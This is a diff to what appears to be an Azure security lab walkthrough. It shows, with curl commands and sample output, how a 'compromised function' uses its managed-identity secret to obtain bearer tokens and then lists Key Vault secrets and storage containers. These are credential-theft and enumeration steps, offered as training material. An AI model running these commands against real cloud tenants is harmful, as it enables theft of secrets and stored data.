@@ -185,9 +185,9 @@ MSI_SECRET=ABC123
 
 Research on MSI architecture: https://techcommunity.microsoft.com/t5/Azure-Developer-Community-Blog/Understanding-Azure-MSI-Managed-Service-Identity-tokens-caching/ba-p/337406
 
-
-```
+```bash
 curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
+echo
 ```
 
 Response is a JWT that can be used to access the storage service for 8 hours. Example of the decoded token:
@@ -222,13 +222,14 @@ From the compromised function, request a Bearer token for the vault service:
 
 ```bash
 curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://vault.azure.net"
+echo
 ```
 
 List the secrets:
 
 ```bash
 export BEARER_TOKEN=<SET TOKEN VALUE>
-export VAULT_NAME=<ENTER_KEY_VAULT_NAME>
+export VAULT_NAME=cougar$TF_VAR_UniqueString
 curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0"
 ```
 
@@ -254,20 +255,68 @@ From the compromised function, request a Bearer token for the storage service:
 
 ```bash
 curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
+echo
 ```
 
 List the storage account containers:
 
 ```bash
 export BEARER_TOKEN=<SET TOKEN VALUE>
-export STORAGE_ACCOUNT=<ENTER STORAGE ACCOUNT NAME>
-curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/?comp=list"
+export STORAGE_ACCOUNT=cougar$TF_VAR_UniqueString
+curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/?comp=list" | xmllint --format -
 ```
 
-OMG, you're killing me MS. XML? How the hell am I supposed to `jq` this now.
-
 ```xml
-<?xml version="1.0" encoding="utf-8"?><EnumerationResults ServiceEndpoint="https://<STORAGE_ACCOUNT_NAME>.blob.core.windows.net/"><Containers><Container><Name>azure-webjobs-hosts</Name><Properties><Last-Modified>Thu, 19 Dec 2019 23:34:28 GMT</Last-Modified><Etag>"0x8D784DBFDE574A4"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>azure-webjobs-secrets</Name><Properties><Last-Modified>Thu, 19 Dec 2019 23:34:53 GMT</Last-Modified><Etag>"0x8D784DC0CC0565B"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>function-releases</Name><Properties><Last-Modified>Mon, 23 Dec 2019 18:44:03 GMT</Last-Modified><Etag>"0x8D787D8157D05E8"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>images</Name><Properties><Last-Modified>Tue, 24 Dec 2019 18:24:51 GMT</Last-Modified><Etag>"0x8D7889E911892AF"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container><Container><Name>scm-releases</Name><Properties><Last-Modified>Thu, 19 Dec 2019 23:34:21 GMT</Last-Modified><Etag>"0x8D784DBF9AF6632"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold></Properties></Container></Containers><NextMarker /></EnumerationResults>
+<?xml version="1.0" encoding="utf-8"?>
+<EnumerationResults ServiceEndpoint="https://cougar<UNIQUE_STRING>.blob.core.windows.net/">
+  <Containers>
+    <Container>
+      <Name>azure-webjobs-hosts</Name>
+      <Properties>
+        <Last-Modified>Thu, 19 Mar 2020 17:52:51 GMT</Last-Modified>
+        <Etag>"0x8D7CC2E584F1AF9"</Etag>
+        <LeaseStatus>unlocked</LeaseStatus>
+        <LeaseState>available</LeaseState>
+        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
+        <HasLegalHold>false</HasLegalHold>
+      </Properties>
+    </Container>
+    <Container>
+      <Name>azure-webjobs-secrets</Name>
+      <Properties>
+        <Last-Modified>Thu, 19 Mar 2020 17:52:47 GMT</Last-Modified>
+        <Etag>"0x8D7CC2E559F352A"</Etag>
+        <LeaseStatus>unlocked</LeaseStatus>
+        <LeaseState>available</LeaseState>
+        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
+        <HasLegalHold>false</HasLegalHold>
+      </Properties>
+    </Container>
+    <Container>
+      <Name>function-releases</Name>
+      <Properties>
+        <Last-Modified>Thu, 19 Mar 2020 17:50:20 GMT</Last-Modified>
+        <Etag>"0x8D7CC2DFE3B3EE4"</Etag>
+        <LeaseStatus>unlocked</LeaseStatus>
+        <LeaseState>available</LeaseState>
+        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
+        <HasLegalHold>false</HasLegalHold>
+      </Properties>
+    </Container>
+    <Container>
+      <Name>scm-releases</Name>
+      <Properties>
+        <Last-Modified>Thu, 19 Mar 2020 17:50:31 GMT</Last-Modified>
+        <Etag>"0x8D7CC2E049DE518"</Etag>
+        <LeaseStatus>unlocked</LeaseStatus>
+        <LeaseState>available</LeaseState>
+        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
+        <HasLegalHold>false</HasLegalHold>
+      </Properties>
+    </Container>
+  </Containers>
+  <NextMarker/>
+</EnumerationResults>
 ```
 
 List the blobs in the images container:
